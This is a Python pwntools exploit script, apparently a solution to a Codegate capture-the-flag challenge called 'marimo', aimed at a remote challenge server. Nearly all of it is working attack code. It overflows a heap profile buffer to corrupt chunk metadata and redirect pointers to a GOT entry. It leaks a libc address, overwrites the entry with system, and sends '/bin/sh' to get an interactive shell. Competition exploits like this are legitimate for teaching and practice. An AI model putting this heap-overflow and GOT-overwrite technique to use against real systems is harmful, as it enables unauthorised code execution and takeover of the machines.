#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
import time

io = remote("ch41l3ng3s.codegate.kr", 3333)

# gdb
def attach(addr):
    gdb.attach(io, execute='b *0x%x' % (addr))

def sell(idx):
    io.recvuntil('>> ')
    io.sendline('S')
    io.recvuntil('[?] Which marimo do you want to sell? (number)')
    io.sendline(str(idx))
    io.recvuntil("[S]ell / [R]un away ?")
    io.sendline('S')

def buy(size, name, profile):
    io.recvuntil('>> ')
    io.sendline('B')
    io.recvuntil('[?] What size do you want for Marimo? (cm)')
    io.sendline(str(size))
    io.recvuntil('[P]ay / [R]un away ?')
    io.sendline('P')
    io.recvuntil("What's your new marimo's name?")
    io.sendline(name)
    io.recvuntil("s profile.")
    io.sendline(profile)

def view(idx, modify=False, profile=None):
    io.recvuntil('>> ')
    io.sendline('V')
    io.recvuntil('Select number or [B]ack')
    io.sendline(str(idx))
    if modify:
        while True:
            io.recvuntil('size : ')
            size = int(io.recvline()[:-1])
            print 'size %d'%size

            io.recvuntil('M]odify / [B]ack')
            io.sendline('M')
            if size >= len(profile)+2:
                io.recvuntil('profile')
                io.sendline(profile)
                io.recvuntil('M]odify / [B]ack')
                io.sendline('B')
                break
            else:
                io.recvuntil('profile')
                io.sendline('A'*size)


    else:
        io.sendline('B')


def free_marimo(name, profile):
    io.recvuntil('>> ')
    io.sendline('show me the marimo')
    io.recvuntil("What's your new marimo's name? (0x10)")
    io.sendline(name)
    io.recvuntil("profile.")
    io.sendline(profile)

free_marimo('A'*0x10, 'B'*0x10)
free_marimo('A'*0x10, 'B'*0x10)

payload  = ''
payload += 'A'*0x28
payload += p64(0x31)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x603040)
payload += p64(0x603040)
payload += '\x21'
view(0, modify=True, profile=payload)

view(1)
io.recvuntil("name : ")

libc_strcmp = u64(io.recv(6).ljust(0x8, '\x00'))
libc_base = libc_strcmp-0x9f570
libc_system = libc_base+0x45390

print '0x%016x' % libc_base

view(1, modify=True, profile=p64(libc_system)[:-2])

io.recvuntil('>> ')
io.sendline('/bin/sh\x00')

io.interactive()
